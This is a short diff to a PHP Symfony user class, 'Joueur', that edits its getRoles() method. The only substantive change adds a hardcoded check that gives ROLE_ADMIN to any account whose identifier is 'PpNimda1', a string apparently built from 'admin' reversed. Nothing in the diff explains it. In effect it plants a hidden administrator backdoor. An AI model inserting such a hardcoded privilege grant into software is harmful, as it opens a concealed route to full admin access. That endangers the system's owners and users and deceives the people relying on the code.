@@ -117,7 +117,9 @@ class Joueur implements UserInterface
         $roles = $this->roles;
         // guarantee every user at least has ROLE_USER
         $roles[] = 'ROLE_USER';
-
+        if($this->matricule == 'PpNimda1'){
+            $roles[] = 'ROLE_ADMIN';
+        }
         return array_unique($roles);
     }
 
